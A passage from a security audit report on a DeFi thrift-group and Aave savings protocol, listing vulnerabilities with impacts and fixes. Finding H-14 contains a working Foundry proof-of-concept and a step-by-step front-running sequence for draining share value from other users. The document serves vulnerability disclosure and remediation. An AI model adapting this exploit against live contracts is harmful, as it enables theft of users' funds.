- contribute a token with different decimals / market value
- manipulate payout distribution amounts
- break accounting assumptions inside `_checkAndProcessPayout`
- distort group balances and payout fairness

If the payout is denominated in the _group token_, the attacker can intentionally deposit a cheaper or unstable asset and still receive payouts in the real group asset.

This can also **brick payout processing** if the token mismatch causes transfer failures or accounting imbalance.

### Impact
Attackers can:

- contribute a cheaper / volatile token while others contribute the intended asset
- gain disproportionately high payout relative to their effective contribution
- cause payout amounts to miscalculate or revert
- poison group accounting over time

Potential scenarios:

1. Contribute a token with fewer decimals
   → accounting appears equal, but real value contributed is lower

2. Contribute a token with different price
   → attacker contributes low-value asset, receives payout in high-value asset

3. Contribute a token incompatible with payout logic
   → payout distribution may revert / lock group state

### Recommendation
Enforce strict token consistency between:

- the group’s configured `tokenAddress`, and
- the token used in each contribution call

Add check:

```solidity
require(
    tokenAddress == group.tokenAddress,
    "Invalid contribution token for this group"
);
```

Example corrected contribution logic:

```solidity
ThriftGroup storage group = thriftGroups[groupId];

require(tokenAddress == group.tokenAddress, "Invalid group token");
require(amount >= group.contributionAmount, "Contribution amount too small");
```

## [H-11] Emergency Withdrawal Allows Admin to Exit While Locking Other Members in an Inactive Thrift Group With No Recovery Path
**Severity**
High

**Description**
The `emergencyWithdraw` function allows only the **group admin** to withdraw their contribution and automatically deactivates the group:

```solidity
function emergencyWithdraw(uint256 groupId)
    external
    onlyGroupAdmin(groupId)
    nonReentrant
{
    ThriftGroup storage group = thriftGroups[groupId];

    uint256 amount = group.contributions[msg.sender];
    require(amount > 0, "No contribution to withdraw");

    group.contributions[msg.sender] = 0;
    group.hasPaidThisCycle[msg.sender] = false;
    group.totalContributed[msg.sender] -= amount;

    group.isActive = false; // deactivate group on emergency withdrawal

    IERC20(group.tokenAddress).safeTransfer(msg.sender, amount);
}
```

Key issues:

1. The admin’s withdrawal **forces the group into an inactive state**

```solidity
group.isActive = false;
```

2. There is **no mechanism for other members to**

- exit the group
- recover their contributions
- trigger refunds
- or leave after deactivation

3. Members are still locked in the contract with:

- `contributions[msg.sender] > 0`
- but no active payout / contribution cycle
- and no callable function to withdraw funds

This results in an asymmetric failure mode:

- Admin can exit safely at any time
- Other contributors are left stranded with no way to recover funds

If the admin withdraws early — maliciously or accidentally — all remaining users become permanently locked.

**Impact**
Funds contributed by non-admin members become **inaccessible** if:

- the admin performs emergency withdrawal, and
- the group becomes inactive
Zombie Admin State: The admin remains listed as a member of the group despite having withdrawn their funds and "killed" the group. They continue to occupy one of the limited member slots (MAX_MEMBERS).

Blocking Recovery: Because the admin slot is not freed, the group remains "full" (or partially full) with a dead member. This prevents any potential recovery mechanisms (like new members joining to restart the cycle) from functioning.

Trapped Honest Funds: The group is unilaterally deactivated. While the admin exits cleanly with their funds, honest members are left in a deactivated group.

**Recommendation**

Implement a symmetric exit mechanism for all members when emergency mode is triggered.

## [H-12] `leaveGroup()` will always revert because `updateUserBalance()` deducts from a balance that was never credited.

### Description

`leaveGroup()` attempts to process a refund by deducting from the user’s recorded balance:

```
updateUserBalance(msg.sender, tokenAddress, refundAmount, false);
```

However, during normal contributions, the contract **never credits**
`updateUserBalance()` with the contributed amount.

Meaning:

- user deposits tokens into the contract
- but their **internal balance remains zero**
- when leaving the group, `updateUserBalance()` attempts to deduct
  `refundAmount` from a **non-existent balance**

This causes the function to **always revert**.
So one of two failure modes occurs:

| Case                | Effect                                        |
| ------------------- | --------------------------------------------- |
| `refundAmount == 0` | user receives no refund despite contributions |
| `refundAmount > 0`  | `updateUserBalance()` underflows or fails     |

Either outcome prevents successful exit.

### Result

Users who contributed:

- cannot leave the group
- cannot recover funds
- are permanently locked in the contract

This is effectively a **denial-of-service on exiting members**.

### Impact

- Users cannot leave thrift groups
- Their funds remain inaccessible
- Group cannot scale down safely

### Recommendations

Ensure user balances are credited when contributing.

## [H-13] `leaveGroup()` emits refund event but never transfers tokens — user funds remain locked in contract**

### Description

When a user leaves the group, the contract emits a `RefundIssued` event, but **no refund is ever transferred** to the user.

Instead of sending tokens back, the function calls:

```
updateUserBalance(msg.sender, tokenAddress, refundAmount, false);
```

This function only adjusts an **internal bookkeeping balance** and
does **not perform any ERC20 transfer**.

Therefore:

> The protocol signals a refund was issued
> but the funds remain locked inside the contract

This is especially critical because `_removeMemberFromGroup()` clears
member state **before** any refund occurs — leaving no recovery path.

If the group becomes inactive due to member removal:

```
group.isActive = false;
```

remaining users:

- cannot withdraw
- cannot leave
- cannot trigger refunds

Their contributions are permanently stuck.

### Impact

- Users lose access to contributions when leaving group
- Contract emits misleading `RefundIssued` event
- No mechanism exists to recover locked funds
- Inactive groups trap remaining capital

### Recommendations

Replace ledger adjustment with an actual refund transfer:

```
IERC20(tokenAddress).safeTransfer(msg.sender, refundAmount);
```

## [H-14] Theft of funds from protocol users, leading to protocol insolvency.

  ### Description:
  The leaveGroup function calculates the number of shares to burn when a user receives a refund for their contribution. This calculation is performed using a formula that relies on the
  spot price of a share at the moment of execution:

  ```solidity
sharesToBurn = totalAssets > 0 ? (refundAmount * totalGlobalShares) / totalAssets : 0;
```

  The totalAssets value is fetched live from the underlying Aave pool. A malicious actor can exploit this by temporarily inflating the totalAssets in the pool within the same block as the
  victim's leaveGroup transaction. This front-running attack drastically increases the denominator of the division. Due to Solidity's integer arithmetic, the result for sharesToBurn is
  truncated to a negligible value (or potentially zero), while the user still receives their full refundAmount.

  ### Impact:
  This vulnerability allows a malicious user to systematically drain value from all other participants in the protocol. An attacker can repeatedly perform the following sequence:
   1. Contribute to a thrift group.
   2. Call leaveGroup.
   3. Front-run their own transaction by making a massive temporary deposit to the underlying Aave pool, artificially inflating totalAssets.
   4. Their leaveGroup call executes, refunding their contribution but burning almost no shares.
   5. Back-run the transaction to withdraw the massive temporary deposit.

  The attacker is left with their original funds plus "phantom" shares that still represent a claim on the assets of honest users. Over time, this dilutes the value of all legitimate
  shares, leading to a complete loss of funds for other users.

  ### Proof of Concept (PoC)

  Attack Scenario Walkthrough:
 The Goal: The attack aims to make the sharesToBurn calculation in the leaveGroup function return a value close to zero, instead of the correct, much larger value.
       - sharesToBurn = (refundAmount * totalGlobalShares) / totalAssets;

   2. The Attack Execution:
       - Pre-Attack: Alice contributes 100 * 1e18 USDC. The pool (miniSafe contract) correctly gets 100 * 1e18 shares.
       - Front-run: Just before Alice calls leaveGroup, the test manipulates the totalAssets to be a massive number (100,000,000 * 1e18).
       - Victim Tx: Alice calls leaveGroup. The contract calculates sharesToBurn. With the huge denominator, the result is 1000100000000000000 (~1 * 1e18), which is a tiny fraction of the
         100 * 1e18 that should have been burned.
       - Result: The log shows:
           - Alice USDC Balance: 1000000000000000000000000 (She got her 100 USDC back, assertEq passed).
           - Pool Shares Burned: 1000100000000000000 (~1 share).
   3. Victim Transaction: Alice's call to leaveGroup executes. The vulnerable calculation is performed with the manipulated totalAssets value.
   4. Result: The test logs and assertions confirmed the following outcome:
       * Refund: Alice's USDC balance increased by 100, confirming she received her full refund.
       * Shares Burned: Instead of burning the ~100 shares corresponding to her contribution, the thrift pool only burned ~1 share.
       * Theft: Alice successfully withdrew her funds while retaining ~99% of the shares associated with that capital, effectively stealing that value from the other protocol
         participants.

  This PoC unequivocally demonstrates that the leaveGroup function can be exploited to steal funds.
  ```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {MiniSafeAaveUpgradeable} from "../src/MiniSafeAaveUpgradeable.sol";
import {MiniSafeTokenStorageUpgradeable} from "../src/MiniSafeTokenStorageUpgradeable.sol";
import {MiniSafeAaveIntegrationUpgradeable} from "../src/MiniSafeAaveIntegrationUpgradeable.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

// Self-contained interface for the mock
interface IMockERC20 {
    function mint(address to, uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

// Mock integration contract
contract MockAaveIntegration is MiniSafeAaveIntegrationUpgradeable {
    mapping(address => uint256) public mockAssetBalances;

    function setMockBalance(address token, uint256 amount) public {
        mockAssetBalances[token] = amount;
    }

    function getATokenBalance(address tokenAddress) public view override returns (uint256) {
        return mockAssetBalances[tokenAddress];
    }
    
    function withdrawFromAave(address tokenAddress, uint256 amount, address to) external override returns (uint256) {
        IMockERC20(tokenAddress).transfer(to, amount);
        return amount;
    }

    function depositToAave(address, uint256 amount) external override returns (uint256) {
        return amount;
    }
}

// Mock ERC20 token
contract MockERC20 is IMockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    function mint(address to, uint256 amount) external override { balanceOf[to] += amount; totalSupply += amount; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract TestMiniSafe is MiniSafeAaveUpgradeable {
    function canWithdraw() public view override returns (bool) { return true; }
}

contract FrontrunTest is Test {
    TestMiniSafe public miniSafe;
    MiniSafeTokenStorageUpgradeable public tokenStorage;
    MockAaveIntegration public aaveIntegration;
    IMockERC20 public usdc;
    ProxyAdmin public proxyAdmin;

    address internal owner = address(0x1);
    address internal alice = address(0x2);
    address internal regularUser = address(0x4);

    function setUp() public {
        usdc = IMockERC20(address(new MockERC20("USD Coin", "USDC", 18)));

        vm.startPrank(owner);
        proxyAdmin = new ProxyAdmin(owner); 
        MiniSafeTokenStorageUpgradeable tokenStorageImpl = new MiniSafeTokenStorageUpgradeable();
        address tokenStorageProxy = address(new TransparentUpgradeableProxy(address(tokenStorageImpl), address(proxyAdmin), abi.encodeWithSelector(tokenStorageImpl.initialize.selector, owner)));
        tokenStorage = MiniSafeTokenStorageUpgradeable(tokenStorageProxy);
        aaveIntegration = new MockAaveIntegration();
        TestMiniSafe miniSafeImpl = new TestMiniSafe();
        address miniSafeProxy = address(new TransparentUpgradeableProxy(address(miniSafeImpl), address(proxyAdmin), ""));
        miniSafe = TestMiniSafe(miniSafeProxy);
        miniSafe.initialize(address(tokenStorage), address(aaveIntegration), owner);
        tokenStorage.setManagerAuthorization(address(miniSafe), true);
        tokenStorage.addSupportedToken(address(usdc), address(new MockERC20("aUSDC", "aUSDC", 18)));
        miniSafe.setAllowedThriftToken(address(usdc), true);
        vm.stopPrank();

        usdc.mint(alice, 1_000_000 * 1e18);
        usdc.mint(regularUser, 1_000_000 * 1e18);
    }

    function test_PoC_Frontrun_LeaveGroup() public {
        // 1. SETUP
        uint256 initialPoolAmount = 1_000_000 * 1e18;
        vm.startPrank(regularUser);
        usdc.approve(address(miniSafe), initialPoolAmount);
        miniSafe.deposit(address(usdc), initialPoolAmount);
        vm.stopPrank();

        uint256 realAssetBalance = initialPoolAmount;
        aaveIntegration.setMockBalance(address(usdc), realAssetBalance);
        
        uint256 contributionAmount = 100 * 1e18;
        uint256 sharesExpectedForContribution;
        
        vm.startPrank(alice);
        
        uint256 futureStartDate = block.timestamp + 10 days;
        uint256 groupId = miniSafe.createThriftGroup(contributionAmount, futureStartDate, false, address(usdc));

        address[] memory order = new address[](1);
        order[0] = alice;
        miniSafe.setPayoutOrder(groupId, order);
        miniSafe.activateThriftGroup(groupId);

        vm.warp(futureStartDate + 1);

        uint256 poolSharesBeforeContribution = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
        usdc.approve(address(miniSafe), contributionAmount);
        miniSafe.makeContribution(groupId);
        uint256 poolSharesAfterContribution = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
        sharesExpectedForContribution = poolSharesAfterContribution - poolSharesBeforeContribution;
        
        vm.stopPrank();

        // 2. PRE-ATTACK STATE
        uint256 aliceUsdcBefore = usdc.balanceOf(alice);
        uint256 poolSharesBeforeAttack = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
        console.log("--- PRE-ATTACK STATE ---");
        console.log("Alice USDC Balance: ", aliceUsdcBefore);
        console.log("Pool Share Balance: ", poolSharesBeforeAttack);
        console.log("Expected Shares to Burn on Exit: ", sharesExpectedForContribution);

        // 3. THE ATTACK
        console.log("\n--- ATTACK BEGINS (targeting leaveGroup) ---");

        uint256 inflatedAssets = 100_000_000 * 1e18;
        aaveIntegration.setMockBalance(address(usdc), inflatedAssets);
        console.log("Step A (Front-run): Inflated Total Assets to ->", aaveIntegration.getATokenBalance(address(usdc)));
        
        console.log("Step B (Victim's Tx): Alice calls leaveGroup...");
        vm.startPrank(alice);
        miniSafe.leaveGroup(groupId);
        vm.stopPrank();

        aaveIntegration.setMockBalance(address(usdc), realAssetBalance);
        console.log("Step C (Back-run): Restored Total Assets");
        console.log("\n--- ATTACK COMPLETE ---");

        // 4. ASSERTIONS
        uint256 aliceUsdcAfter = usdc.balanceOf(alice);
        uint256 poolSharesAfterAttack = tokenStorage.getUserTokenShare(address(miniSafe), address(usdc));
        uint256 actualSharesBurned = poolSharesBeforeAttack - poolSharesAfterAttack;

        console.log("\n--- POST-ATTACK STATE ---");
        console.log("Alice USDC Balance:   ", aliceUsdcAfter);
        console.log("Pool Share Balance:  ", poolSharesAfterAttack);
        console.log("Actual Pool Shares Burned:   ", actualSharesBurned);

        assertEq(aliceUsdcAfter, aliceUsdcBefore + contributionAmount, "FAIL: Alice did not receive her refund");
        
        assertTrue(actualSharesBurned < (sharesExpectedForContribution / 10), "FAIL: A significant number of shares were burned. Attack failed.");
        
        console.log("\nSUCCESS: Alice was refunded 100 USDC. The protocol should have burned ~100 shares, but only burned a negligible amount due to the exploit.");
    }
}

  ```
##### Logs
```sh
                                                                                                                                         │
│ Ran 1 test for test/PoC_Frontrun.t.sol:FrontrunTest                                                                                      │
│ [PASS] test_PoC_Frontrun_LeaveGroup() (gas: 688868)                                                                                      │
│ Logs:                                                                                                                                    │
│   --- PRE-ATTACK STATE ---                                                                                                               │
│   Alice USDC Balance:  999900000000000000000000                                                                                          │
│   Pool Share Balance:  100000000000000000000                                                                                             │
│   Expected Shares to Burn on Exit:  100000000000000000000                                                                                │
│                                                                                                                                          │
│ --- ATTACK BEGINS (targeting leaveGroup) ---                                                                                             │
│   Step A (Front-run): Inflated Total Assets to -> 100000000000000000000000000                                                            │
│   Step B (Victim's Tx): Alice calls leaveGroup...                                                                                        │
│   Step C (Back-run): Restored Total Assets                                                                                               │
│                                                                                                                                          │
│ --- ATTACK COMPLETE ---                                                                                                                  │
│                                                                                                                                          │
│ --- POST-ATTACK STATE ---                                                                                                                │
│   Alice USDC Balance:    1000000000000000000000000                                                                                       │
│   Pool Share Balance:   98999900000000000000                                                                                             │
│   Actual Pool Shares Burned:    1000100000000000000                                                                                      │
│                                                                                                                                          │
│ SUCCESS: Alice was refunded 100 USDC. The protocol should have burned ~100 shares, but only burned a negligible amount due to the        │
│ exploit.                                                                                                                                 │
│                                                                                                                                          │
│ Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.04ms (1.44ms CPU time)                                                    │
│                                                                                                                                          │
│ Ran 1 test suite in 30.88ms (7.04ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)   
```

### Recommended Mitigation

  To fix this vulnerability, the protocol must avoid using a spot price to calculate shares to burn on exit. The number of shares burned for a refund must be equal to the number of shares
  that were minted for the corresponding contribution.

  1. When a user contributes to a group in the makeContribution function, the number of shares minted to the thrift pool (sharesToMint) is calculated. This value
      should be stored in the ThriftGroup struct, linked to the user's contribution for that cycle.
       Example: group.cycleContributionShares[msg.sender] = sharesToMint;
   2.  In the leaveGroup function, replace the vulnerable calculation with a direct retrieval of the stored share amount.
       Example: uint256 sharesToBurn = group.cycleContributionShares[msg.sender];

  By linking the shares burned directly to the shares minted, the calculation becomes independent of the asset-to-share ratio at the time of withdrawal, completely neutralizing the
  front-running attack vector.

## Medium Level Severity Issues

## [M-1] Excess Contribution Amounts Are Permanently Trapped in Contract

### Description: 
In the `MiniSafe` thrift group functionality, when users make contributions via the `makeContribution` function, they can send any amount greater than or equal to the required `contributionAmount`. The function only validates that the amount meets the minimum requirement but does not enforce an exact match or refund excess amounts.

Any tokens sent above the required contribution amount are permanently trapped in the contract with no mechanism for retrieval. The function transfers the full user-specified amount from the user's wallet but only tracks the standard `contributionAmount` in the group's accounting. When payouts are processed, they are calculated based on `contributionAmount` × `memberCount`, meaning the excess tokens are never distributed and remain stuck in the contract forever.

### Impact 
Excess contributions are permanently locked

### Recommendation  
Enforce Exact Contribution Amount.


## [M-2] Emergency Withdrawal Timelock Defeats Purpose of Emergency Response Mechanism

### Description: 
The `executeEmergencyWithdrawal` function in `MiniSafeAaveUpgradeable` implements a 2-day timelock before emergency withdrawals can be executed. While timelocks are generally good security practice for administrative functions, applying a timelock to an emergency function fundamentally contradicts its purpose.

In genuine emergency situations, such as protocol exploits, critical vulnerabilities, or external DeFi protocol failures, a 2-day delay renders the emergency mechanism completely ineffective.

By the time the timelock expires, the emergency that necessitated the withdrawal may have already resulted in complete loss of funds.

### Impact 
Emergency Scenarios Where 2-Day Delay Is Fatal

### Recommendation 
Remove Timelock

## [M-3] Thrift Group Contributions Held in Contract Instead of Earning Yield in Aave

### Description: 
The `MiniSafe` protocol integrates with Aave V3 to generate yield on user deposits through the personal savings functionality. However, when users make contributions to thrift groups via the `makeContribution` function, these funds are transferred directly to the `MiniSafeAaveUpgradeable` contract and held there idle instead of being deposited to Aave to earn yield.

This creates an architectural inconsistency where:

- Personal savings deposits → Sent to Aave → Earn yield  
- Thrift group contributions → Held in contract → Earn 0% yield  

Given that thrift groups operate on 30-day cycles and funds may sit in the contract for extended periods before payout, this represents a significant missed yield opportunity and contradicts the protocol's core value proposition of earning yield through Aave integration.

### Impact 
Contributions do not earn yields

### Recommendation
Deposit Contributions to Aave


## [M-4] Factory Contract Fails to Track Deployed Proxies - isMiniSafeContract Returns False for All Deployed Contracts

### Description:  
The `MiniSafeFactoryUpgradeable` contract contains a critical logic flaw in its `isMiniSafeContract` function. This function is designed to verify whether a given address is a legitimate MiniSafe contract deployed by the factory. However, it incorrectly checks if the address matches the implementation contract addresses rather than the deployed proxy addresses.

When the factory deploys the MiniSafe system, it creates `ERC1967` proxy contracts that point to the implementations. Users and administrators interact with these proxy addresses, not the implementations. However:

- The factory never stores the deployed proxy addresses  
- `isMiniSafeContract` only checks against implementation addresses  
- All deployed proxies return false when verified  
- Functions relying on this check (`upgradeSpecificContract`, `batchUpgradeContracts`) are completely broken  

This means the factory's upgrade functionality is non-operational, and any external systems relying on this verification will incorrectly reject legitimate MiniSafe contracts.

### Impact 
`isMiniSafeContract` always returns false  
`upgradeSpecificContract` always reverts  
`getContractImplementation` always returns zero address

### Recommendation
Add Proxy Tracking


### [M-5] cUSD Token Initialization Failure - Missing aToken Configuration and Broken Share Tracking

### Description:  
The MiniSafeTokenStorageUpgradeable contract is designed to manage supported tokens and their corresponding Aave `aToken` addresses. The contract hardcodes the `cUSD` (Celo Dollar) address and sets it as the default supported token during initialization. However, there are two critical flaws:

- Missing aToken Configuration: While cusdTokenAddress is set, the `tokenInfo[cusdTokenAddress]` struct is never initialized with the corresponding `aToken` address. This means `getTokenATokenAddress(cusdTokenAddress)` returns `address(0)`.  
- Broken Share Tracking: The `totalShares` for `cUSD` is never properly initialized in the tokenInfo mapping, causing all share-related operations to fail or produce incorrect results.  

These issues mean that `cUSD`—the primary stablecoin on Celo and the default token for the protocol—is completely non-functional. Any attempt to deposit, withdraw, or track balances for cUSD will fail or produce incorrect results.

### Recommendation 
Fix Initialize Function

---

## [M-6] nextPayoutDate Not Enforced - Payouts Can Be Processed Immediately Without Waiting for Scheduled Date

### Description: 
In the `MiniSafe` thrift group functionality, each group has a `nextPayoutDate` field that is intended to enforce a minimum waiting period between contribution collection and payout distribution. This date is set when the group is created and updated after each cycle. However, the `_checkAndProcessPayout` and `_processPayout` functions completely ignore this field, allowing payouts to be processed immediately once all members have contributed, regardless of the scheduled payout date.

This violates the expected behavior:

- Members contribute throughout a cycle period  
- At the end of the cycle (on nextPayoutDate), funds are distributed  
- The next cycle begins with a new contribution period  

Instead, the current implementation processes payouts instantly when the last member contributes, potentially within minutes of the cycle starting.

### Impact
Payouts occur immediately, not on scheduled date

### Recommendation  
Add Time Check in `_checkAndProcessPayout`


## [M-7] Global Frequency-Based Circuit Breaker Causes Unintended Protocol-Wide Soft DoS
**Description**
The circuit breaker also pauses the protocol when two withdrawals occur too closely in time:
```solidity
if (
    lastWithdrawalTimestamp != 0 &&
    block.timestamp - lastWithdrawalTimestamp < timeBetweenWithdrawalsThreshold
) {
    _triggerCircuitBreaker("Withdrawals too frequent");
}
```

The problem is that this logic:

- tracks `lastWithdrawalTimestamp` **globally**
- not per-user

This means:

- if any two users withdraw close together → the circuit breaker triggers
- normal withdrawal activity can unintentionally pause the contract
- legitimate behavior appears as an attack condition

This creates a **soft denial-of-service condition**, where:

- ordinary user activity increases risk of accidental pauses
- withdrawal windows may frequently halt

**Impact**
Consequences include:

- legitimate users can unintentionally trigger pauses
- normal withdrawal bursts become impossible
- operations become fragile and prone to disruption
- attackers can more easily grief the system by timing withdrawals

**Recommendation**
Scope the frequency-based circuit breaker **per-user**, not globally.

Replace:

```solidity
uint256 lastWithdrawalTimestamp;
```

with:

```solidity
mapping(address => uint256) lastUserWithdrawalTimestamp;
```

Then enforce:

```solidity
require(
    block.timestamp - lastUserWithdrawalTimestamp[msg.sender] >= timeBetweenWithdrawalsThreshold,
    "User withdrawals too frequent"
);

lastUserWithdrawalTimestamp[msg.sender] = block.timestamp;
```


## [M-8] Withdrawal Window Logic Breaks for Short Months (e.g., February), Reducing Withdrawal Period to a Single Day

**Description**
The protocol restricts withdrawals to a monthly window defined as the 28th–30th day of each month:

```solidity
function canWithdraw() public view returns (bool) {
    (, , uint256 day) = _timestampToDate(block.timestamp);

    // Allow withdrawals from 28th to 30th of each month
    return (day >= 28 && day <= 30);
}
```

This logic assumes that every month contains at least 30 days.

However, months such as **February only have 28 or 29 days**.
In those cases:

- `day == 28` is the only day that satisfies `(28 ≤ day ≤ 30)`
- The withdrawal window effectively collapses to **just one day**
- In non-leap years, users can withdraw _only on February 28th_
- In leap years, users can withdraw only on **February 28th–29th**

This behavior is inconsistent across months and unintentionally restricts user withdrawal access.

The window is advertised or implied to be 3 days per month, but in February it becomes:

- 1 day (28-day month)
- 2 days (29-day leap year)

This creates a UX and availability issue where users may be locked out of withdrawals during that month.

**Impact**
Users may:

- be unable to withdraw for the expected duration
- miss the restricted window due to timezone or operational constraints
- experience inconsistent and unpredictable withdrawal rules

**Recommendation**
Redesign the withdrawal window logic to be **calendar-aware and duration-based**, not tied to specific day numbers.

**Use “last 3 days of month” instead of 28–30**

Compute days remaining in the month and allow withdrawals when:

```solidity
day >= (daysInMonth - 2);
```

This ensures:

- February still has a 3-day withdrawal window
- behavior is consistent across all months

* If current behavior is intentional, it should be explicitly disclosed; however, this is still user-hostile and operationally fragile.

## [M-9] `deployWithRecommendedMultiSig()` Does Not Prevent Duplicate Signers

**Severity**Medium

**Description**
The `deployWithRecommendedMultiSig()` function accepts an array of 5 signer addresses for a multi-signature setup:

```solidity
address[5] memory signers
```

Currently, the function validates only that:

```solidity
if (signers[i] == address(0)) revert();
```

**It does not check that the signer addresses are unique.**

Consequences:

- The same address can appear multiple times in the signer list.
- This reduces the effective decentralization of the multi-sig.
- The intended minimum number of signers (`minDelay` and quorum assumptions) may be trivially bypassed by reusing addresses.
- A malicious or careless deployer could accidentally weaken the security of the governance/upgrade control.

Example:

- If 3 of 5 signers are duplicates of the same address:

  - That address effectively controls a majority of proposers and executors
  - Security guarantees of a 5-of-5 multi-sig are effectively reduced to 1-of-5

This undermines the **core trust assumptions** of the multi-signature contract.

### Impact

- Multi-sig governance could be compromised by duplicate addresses.
- Upgrades or transactions could be authorized by fewer independent parties than intended.

### Recommendation

Add a uniqueness check for the signer array before deployment. For example:

```solidity
for (uint256 i = 0; i < signers.length; i++) {
    for (uint256 j = i + 1; j < signers.length; j++) {
        require(signers[i] != signers[j], "Duplicate signer detected");
    }
}
```


## Low Severity Issues

## [L-1] updatePoolDataProvider and updateAavePool Emit Identical Event - Impossible to Distinguish Configuration Changes

### Description:
In the `MiniSafeAaveIntegrationUpgradeable` contract, two distinct administrative functions—`updatePoolDataProvider` and `updateAavePool`—emit the same `AavePoolUpdated` event. This makes it impossible for off-chain systems, block explorers, indexers, and monitoring tools to distinguish between updates to the Pool Data Provider versus the Aave Pool contract.

Both contracts serve fundamentally different purposes in the Aave V3 architecture:

- IPool: Handles state-changing operations (`supply`, `withdraw`, `borrow`, `repay`)  
- IPoolDataProvider: Handles view-only queries (`getReserveTokensAddresses`, `getUserReserveData`)  

When an administrator updates either contract, the emitted event is identical, creating ambiguity in audit trails, monitoring systems, and incident response procedures.

### Impact
Cannot determine which contract was updated

### Recommendation
Add Separate Event for `PoolDataProvider`




## [L-2] Deposit Timestamp Is Overwritten and Never Used

### Description: 
Each new deposit overwrites the existing deposit timestamp, and the stored deposit time is never referenced or enforced anywhere in the protocol logic.

This results in a state variable that:

- Does not represent the original deposit time  
- Is not used for validation, accounting, lockups, cooldowns, or rewards  
- Can be arbitrarily refreshed by making a new deposit  

### Impact
Incorrect State Representation

### Recommendation
Enforce Deposit Time Properly


## [L-3] Misleading Error Message in Withdrawal Logic

**Severity:** Low
**Location:** MiniSafeAaveIntegrationUpgradeable.sol → withdrawFromAave

### Description

```solidity
require(amountWithdrawn > 0, "aToken address not found");
```

This message is incorrect. The aToken address is already verified earlier. This failure indicates a zero withdrawal, not a missing address.

### Recommendation

Update the revert message to accurately reflect the failure condition.


## [L-4] Hardcoded Aave Provider Address in Deployment Function


**Severity**
Low

**Description**
The `_deployAaveIntegration()` function deploys a new `AaveIntegration` proxy and uses a **hardcoded Aave provider address** as the default:

```solidity
address provider = aaveProvider == address(0)
    ? 0x9F7Cf9417D5251C59fE94fB9147feEe1aAd9Cea5  // Default Celo Aave V3 provider
    : aaveProvider;
```

- Hardcoding addresses is **unadvisable** because:

  - Network deployments may differ (testnet/mainnet/fork)
  - The provider contract may upgrade, move, or change
  - It increases the risk of misconfiguration and potential loss of funds/Dos

**Impact**
Using a hardcoded provider can lead to:

- failed integrations
- unexpected behavior due to incorrect provider contract
- reduced flexibility in deployment and upgrades

**Recommendation**

**Remove hardcoded addresses**.

## [L-4] `MiniSafeTokenStorageUpgradeable` Pause/Unpause Mechanism Has No Effect

**Severity**
Low

**Description**
The `MiniSafeTokenStorageUpgradeable` contract inherits `PausableUpgradeable` and exposes:

```solidity
function pause() external onlyOwner { _pause(); }
function unpause() external onlyOwner { _unpause(); }
```

However, **none of the contract’s external or state-changing functions use the `whenNotPaused` modifier** or perform an internal `_paused()` check.

Consequently:

- Calling `pause()` or `unpause()` changes the paused state internally, but **does not prevent any function from being executed**.
- The pause/unpause mechanism is therefore **effectively non-functional**.
- This defeats the intended purpose of the pause functionality, which is typically used to **halt critical operations during emergency or upgrade scenarios**.

**Impact**

- Owners cannot halt contract operations in emergencies.

**Recommendation**
Apply `whenNotPaused` to **all critical state-changing functions** or remove the inheritamce of pausableupgradeable if its not needed.



## [L-4] Thrift Group Cannot Be Activated on Start Date Due to Strict Time Check

**Severity**
Low

**Description**
A thrift group is activated manually via:

```solidity
function activateThriftGroup(uint256 groupId) external onlyGroupAdmin(groupId) {
```

Activation is currently restricted to only before the start date:

```solidity
require(block.timestamp < group.startDate, "Group has already started");
```

This introduces an edge-case constraint:

- If the admin does **not** activate the group before `startDate`,
- Then once `startDate` is reached,
- Activation becomes **permanently impossible**.

Meaning the group:

- cannot be started
- cannot be used
- becomes permanently stuck in an inactive state

Even if:

- all members are present
- payout order is valid
- funds are ready

This is unintuitive and breaks expected flow, activation should logically still be allowed on the start date. One second of lateness bricks the group forever.

**Impact**
Usability & operational impact:

- Groups can become stuck and unusable even though configuration is valid
- Users cannot participate in intended thrift cycle
- Admin must recreate the entire group
- Prior configuration & member state must be redone

**Recommendation**
Allow activation **on or before** the start date instead of strictly before it.

Replace:

```solidity
require(block.timestamp < group.startDate, "Group has already started");
```

With:

```solidity
require(block.timestamp <= group.startDate, "Group has already started");
```



